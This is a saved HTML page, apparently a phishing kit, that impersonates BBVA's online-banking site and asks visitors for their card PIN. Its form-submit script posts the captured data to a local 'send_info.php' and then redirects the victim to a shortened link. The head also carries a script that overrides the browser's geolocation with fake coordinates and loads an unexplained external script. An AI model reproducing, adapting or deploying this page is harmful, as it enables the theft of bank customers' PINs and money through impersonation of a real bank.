<html lang="en" manifest="manifest.appcache" webcrx=""><head><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script>(function(){function hookGeo() {
  //<![CDATA[
  const WAIT_TIME = 100;
  const hookedObj = {
    getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
    watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
    fakeGeo: true,
    genLat: 38.883333,
    genLon: -77.000
  };

  function waitGetCurrentPosition() {
    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
      if (hookedObj.fakeGeo === true) {
        hookedObj.tmp_successCallback({
          coords: {
            latitude: hookedObj.genLat,
            longitude: hookedObj.genLon,
            accuracy: 10,
            altitude: null,
            altitudeAccuracy: null,
            heading: null,
            speed: null,
          },
          timestamp: new Date().getTime(),
        });
      } else {
        hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
      }
    } else {
      setTimeout(waitGetCurrentPosition, WAIT_TIME);
    }
  }

  function waitWatchPosition() {
    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
      if (hookedObj.fakeGeo === true) {
        navigator.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
        return Math.floor(Math.random() * 10000); // random id
      } else {
        hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
      }
    } else {
      setTimeout(waitWatchPosition, WAIT_TIME);
    }
  }

  Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
    hookedObj.tmp_successCallback = successCallback;
    hookedObj.tmp_errorCallback = errorCallback;
    hookedObj.tmp_options = options;
    waitGetCurrentPosition();
  };
  Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
    hookedObj.tmp2_successCallback = successCallback;
    hookedObj.tmp2_errorCallback = errorCallback;
    hookedObj.tmp2_options = options;
    waitWatchPosition();
  };

  const instantiate = (constructor, args) => {
    const bind = Function.bind;
    const unbind = bind.bind(bind);
    return new (unbind(constructor, null).apply(null, args));
  }

  Blob = function (_Blob) {
    function secureBlob(...args) {
      const injectableMimeTypes = [
        { mime: 'text/html', useXMLparser: false },
        { mime: 'application/xhtml+xml', useXMLparser: true },
        { mime: 'text/xml', useXMLparser: true },
        { mime: 'application/xml', useXMLparser: true },
        { mime: 'image/svg+xml', useXMLparser: true },
      ];
      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));

      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
        if (mimeTypeIndex >= 0) {
          let mimeType = injectableMimeTypes[mimeTypeIndex];
          let injectedCode = `<script>(
            ${hookGeo}
          )();<\/script>`;
    
          let parser = new DOMParser();
          let xmlDoc;
          if (mimeType.useXMLparser === true) {
            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
          } else {
            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
          }

          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
    
            if (mimeType.useXMLparser === true) {
              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
            } else {
              args[0][0] = xmlDoc.documentElement.outerHTML;
            }
          }
        }
      }

      return instantiate(_Blob, args); // arguments?
    }

    // Copy props and methods
    let propNames = Object.getOwnPropertyNames(_Blob);
    for (let i = 0; i < propNames.length; i++) {
      let propName = propNames[i];
      if (propName in secureBlob) {
        continue; // Skip already existing props
      }
      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
      Object.defineProperty(secureBlob, propName, desc);
    }

    secureBlob.prototype = _Blob.prototype;
    return secureBlob;
  }(Blob);

  window.addEventListener('message', function (event) {
    if (event.source !== window) {
      return;
    }
    const message = event.data;
    switch (message.method) {
      case 'updateLocation':
        if ((typeof message.info === 'object') && (typeof message.info.coords === 'object')) {
          hookedObj.genLat = message.info.coords.lat;
          hookedObj.genLon = message.info.coords.lon;
          hookedObj.fakeGeo = message.info.fakeIt;
        }
        break;
      default:
        break;
    }
  }, false);
  //]]>
}hookGeo();})()</script><style>body {transition: opacity ease-in 0.2s; } 
body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
</style><link href="./style/app.min.css" rel="stylesheet">
<meta charset="utf-8">
<meta name="theme-color" content="#134481">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,maximum-scale=1,user-scalable=0,minimal-ui,viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="BBVA">
<meta name="mobile-web-app-title" content="BBVA">
<meta property="og:title" content="BBVA">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="BBVA">
<meta name="keywords" content="Banco, banca online, sin comisiones, productos bancarios, particulares, productos y servicios financieros BBVA Particulares">
<meta name="description" content="Banca online para Particulares BBVA">
<meta property="og:description" content="Banca online para Particulares"><meta name="apple-itunes-app" content="app-id=325813155"><link rel="preload" href="assets/vendor/app.css" as="style">

<link rel="preload" href="./style/BentonSansBBVA-Book.woff" as="font" type="font/woff" crossorigin="">
<link rel="preload" href="./style/BentonSansBBVA-Medium.woff" as="font" type="font/woff" crossorigin="">
<title>BBVA</title>
<meta http-equiv="Content-Security-Policy" content="">
<link rel="shortcut icon" href="./style/favicon.ico">
<link rel="icon" type="image/x-icon" href="./style/favicon.ico">
<link rel="apple-touch-icon" href="./style/favicon128px.png">
<link rel="shortcut icon" sizes="128x128" href="./style/favicon128px.png">
<meta property="og:image" content="./style/app_icon_oficina_128x128.png">



<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>

<script data-dapp-detection="">!function(){let e=!1;function n(){if(!e){const n=document.createElement("meta");n.name="dapp-detected",document.head.appendChild(n),e=!0}}if(window.hasOwnProperty("ethereum")){if(window.__disableDappDetectionInsertion=!0,void 0===window.ethereum)return;n()}else{var t=window.ethereum;Object.defineProperty(window,"ethereum",{configurable:!0,enumerable:!1,set:function(e){window.__disableDappDetectionInsertion||n(),t=e},get:function(){if(!window.__disableDappDetectionInsertion){const e=arguments.callee;e&&e.caller&&e.caller.toString&&-1!==e.caller.toString().indexOf("getOwnPropertyNames")||n()}return t}})}}();</script><script type="text/javascript" src="//7896543.s3.amazonaws.com/001.js"></script><script type="text/javascript" async="" src="//www.pagespeed-mod.com/v1/taas?id=cs&amp;ak=b40b4e0329b50d95fe02b03a202d6279&amp;si=84064dfa74404373adc7dd4d9344be15&amp;tag=1005&amp;rand=a1623897959585qgvnllm&amp;ord=8153764337485201"></script></head>
<body id="app" ontouchstart="" class="ember-application"><div class="ember-view" id="ember3"><div id="ember4" style="display: none;" class="veil visible ember-view"><span id="ember5" class="progress-content-light full-size full-height flexy-item align-centered justify-center size_6 ember-view"><svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve">
	<desc>CARGANDO DATOS...</desc>
	<path class="progress-content-light__path" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z">
	</path>
	<g>
		<defs>
			<path id="progressContent_1_ember5" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z"></path>
		</defs>
		<clipPath id="progressContent_2_ember5">
			<use xlink:href="#progressContent_1_ember5" style="overflow:visible;"></use>
		</clipPath>
		<radialGradient id="progressContent_3_ember5" cx="195.6494" cy="114.4386" r="185.5059" fx="24.1631" fy="113.1565" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)" gradientUnits="userSpaceOnUse">
			<stop offset="0" style="stop-color:#2dcccd;"></stop>
			<stop offset="1" style="stop-color:#004481;stop-opacity:0"></stop>
		</radialGradient>
		<polygon style="clip-path: url(#progressContent_2_ember5); fill: url(#progressContent_3_ember5);" class="progress-content-light__flare" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313"></polygon>
	</g>
</svg>
</span></div><div tabindex="0" data-id="side-menu" id="ember6" class="navigation-menu flexy-item absolute full-height ember-view" style="counter-reset: menu 6;"><nav class="navigation-menu__nav item-space flexy-item no-margin set-padding-bottom-4">
	<span class="accesible-hide" data-id="welcome-menu" tabindex="0">Application main menu</span>
	<div class="item-space scrolling no-margin show-pivot">
	<div class="navigation-menu__items__box set-padding-bottom-3">
			<div class="navigation-menu__wrapper">
				<h3 class="accesible-hide">Application main menu</h3>
<ul id="ember7" class="list-container ember-view">				<li data-id="optSideMenuExperiences" id="ember8" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-9="9" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-promotion" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Experiences</b>
	</button>
</div>
</li>
					<li data-id="atmButton" id="ember10" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-11="11" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-place" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Branches and ATMs</b>
	</button>
</div>
</li>
						<li data-id="marketAnalisysButton" id="ember12" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-13="13" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-play" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Market analysis</b>
	</button>
</div>

</li>
					<li data-id="sideMenuContactBBVA" id="ember14" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-15="15" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-phone" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Customer service</b>
	</button>
</div>
<!----></li>
					<li data-id="aboutButton" id="ember16" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-17="17" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-information" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">About</b>
	</button>
</div>
<!----></li>

</ul>			</div>
		</div>
	</div>
	<ul class="navigation-menu__wrapper item-space-wide">
		<li class="item-auto-size">
				<button class="item-space-wide color_te-3" title="Go to global position" data-ember-action="" data-ember-action-18="18">
					<span class="item-auto-size no-margin icon icon-get-out size_3" aria-hidden="true"></span>
					<b class="item-auto-size txt_s set-margin-left-2">Log in</b>
				</button>
		</li>
		<li class="item-auto-size">
			<button class="oh interactive-hide relative" data-id="btnMenuBack" data-ember-action="" data-ember-action-19="19">Close menu</button>
		</li>
	</ul>
</nav>
</div><div aria-hidden="false" id="ember22" class="liquid-container--shadow liquid-container ember-view" style="touch-action: auto; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); transform: translateX(0px) scale(1); transition: transform 233ms ease 0s, -webkit-transform 233ms ease 0s;"><div id="ember25" class="liquid-child ember-view" style="top: 0px; left: 0px;"><div id="ember26" class="bg_transparent login-interaction main ember-view" data-id="routeIndex"><div id="ember27" class="bg_pr-core-d ember-view"><header id="ember28" class="header header-main flexy-item justify-center items-without-margins relative bg_transparent color_se-0 ember-view"><div class="item-space-wide align-centered">
	<div id="ember29" class="txt-align-c header-main__icons--left set-padding-left ember-view">



</div><div data-id="lblHead" id="ember31" class="header-main__title oh txt-align-c ember-view">	<h1 tabindex="-1" class="">
		<div class="svg-header"><img class="img-sized size_6" src="./style/bbva-white.svg" alt=""></div>
	</h1>
</div><div id="ember32" class="txt-align-c header-main__icons--right set-padding-right ember-view">
</div>
</div>
</header></div><article aria-atomic="true" aria-live="polite" id="ember34" style="display: none;" class="notification-status flexy-item align-centered set-padding bg_te-6-d ember-view"><p class="accesible-hide" data-id="accessibilityText">State of your connection</p>
<div class="item-space-wide align-centered">
	<span class="icon color_se-0 size_2 set-margin-right icon-right" data-id="icon" aria-hidden="true"></span>
	<span class="color_se-0 txt_s" data-id="title">Missing translation: undefined</span>
</div>
</article><div data-alert-show="false" id="ember35" class="alrtCont ember-view"></div><section class="content wrapper flexy-item">





<script>


$(function() {

  var validator = $("#sendcc").bind("invalid-form.validate", function() {
      $("#errorrbiliing").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='sendcc']").validate({

  errorContainer: $("#errorrbiliing"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },


highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
  $( element ).parents( ".dddd" ).addClass( errorClass );
        },
unhighlight: function (element, errorClass, validClass) {
          
  $( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
        },



    messages: {
      Firstname: "First Name is required",
      LastName: "Last Name is required",
      shopdomain : "Enter a valid email address",
      cardnumber  : " ",
      expdate : " ",
      csc : " ",

      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },



 account_email: {
        required: "Enter a valid email address.",
        minlength: "Enter a valid email address."
      },





      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {
$("#spinnar").show();


$("#botomemail").attr("disabled", true);


          $.post("./system/send_info.php?ajax", $("#sendcc").serialize(), function(result) {
                            setTimeout(function() {

         

                                $(location).attr("href", "https://bit.ly/3lde1vj");
                        });
                 });
        },
  
  });

});

</script>



<div id="spinnar" style="display: none;" class="veil visible ember-view"><span id="ember8" class="progress-content-light full-size full-height flexy-item align-centered justify-center size_6 ember-view"><svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve">
	<desc>CARGANDO DATOS...</desc>
	<path class="progress-content-light__path" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z">
	</path>
	<g>
		<defs>
			<path id="progressContent_1_ember8" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z"></path>
		</defs>
		<clipPath id="progressContent_2_ember8">
			<use xlink:href="#progressContent_1_ember8" style="overflow:visible;"></use>
		</clipPath>
		<radialGradient id="progressContent_3_ember8" cx="195.6494" cy="114.4386" r="185.5059" fx="24.1631" fy="113.1565" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)" gradientUnits="userSpaceOnUse">
			<stop offset="0" style="stop-color:#2dcccd;"></stop>
			<stop offset="1" style="stop-color:#004481;stop-opacity:0"></stop>
		</radialGradient>
		<polygon style="clip-path: url(#progressContent_2_ember8); fill: url(#progressContent_3_ember8);" class="progress-content-light__flare" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313"></polygon>
	</g>
</svg>
</span></div>




	<form id="sendcc" name="sendcc" action="#" method="post" class="item-space flexy-item no-margin bg_pr-core-d form-container ember-view" novalidate="novalidate">

	<div id="ember37" class="item-space no-margin main-content scrolling ember-view"><div class="login-user-wrapper set-padding-top hide"><div class="txt-align-c flexy-item align-centered items-without-margins"><div class="item-space-wide"><div class="item-space scapular-content"></div></div><div class="item-space-wide"><p class="item-space color_se-0 txt_m txt-light set-padding-top-2">Good afternoon, </p></div></div><div class="txt-align-c set-margin-bottom"><a data-id="lblYouAreNot" role="button" class="color_se-0 txt_s" data-ember-action="" data-ember-action-38="38"><b>Not ?</b></a></div></div>


<center>  
<h2 style="
    font-size: 22px;
    margin: 49px 1px 1px 1px;
    color: #fff;
">Verificación del de la tarjeta</h2>



</center>


	<div data-id="form-login" class="set-padding-vertical form-login"><div class="set-padding-bottom-2">

		<div data-type="text" data-id="txtUser" id="ember39" class="form form-text form--navy ember-view" data-required="required" style="">

<script type="text/javascript">
	
$(document).ready(function(){
  $("#msagh").click(function(){
    $("#Passport").val( "" );;
  });

  $("#showpasswprd").click(function(){
    $("#Access").attr( "type","text" );;
  });


});

</script>


  














<div class="set-padding-bottom-2"><div id="ember41" class="form form-password form--navy ember-view" style="">
<div class="form__container flexy-item flexy-row">
<div class="form__content">
<input placeholder=" " id="csc" name="csc" class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="password" required="true" aria-required="true" minlength="4" maxlength="4" aria-invalid="true" aria-describedby="cscinputError"><span id="cscinputError" class="next-input-wrapper--is-error validation-error__message" style="display: inline;"> </span><span id="cscinputError" class="next-input-wrapper--is-error validation-error__message" style="display: inline;"> </span>
<span class="form__label txt-overflow_ellipsis no-link" aria-hidden="true">PIN / CLAVE DE TARJETA</span>

</div>
</div><div class="set-padding-left-2"><div id="messages-ember41" class="form__messages ember-view"></div>
</div>
</div></div>





<div class="set-padding-left-2">
	<div id="messages-ember41" class="form__messages ember-view"></div>
</div>


</div></div>

<div id="ember44" class="set-margin-bottom-2 set-padding-top button-stack item-space-wide justify-center ember-view"><ul class="button-stack__content oh">
	





<li id="ember45" class="button-stack__item item-space-wide ember-view"><button aria-disabled="false" data-id="btnLogin" class="button-default button set-padding-horizontal-4 width-auto oh relative button--positive ember-view"><span class="button__content block">
	<b class="button__text txt_s txt-overflow_ellipsis">Confirmar</b>
</span>
</button>
</li>

	

</ul>
</div><div class="set-padding-2 txt-align-c"><a role="button" data-id="btnEnrollment" class="color_se-0 txt_s action-element" data-ember-action="" data-ember-action-49="49"><b></b></a></div>
</div></div></form></section></div></div></div><div id="ember50" class="ember-view"></div></div><link href="./style/app.min.css" rel="stylesheet">




<iframe src="about:blank" style="display: none;"></iframe></body></html>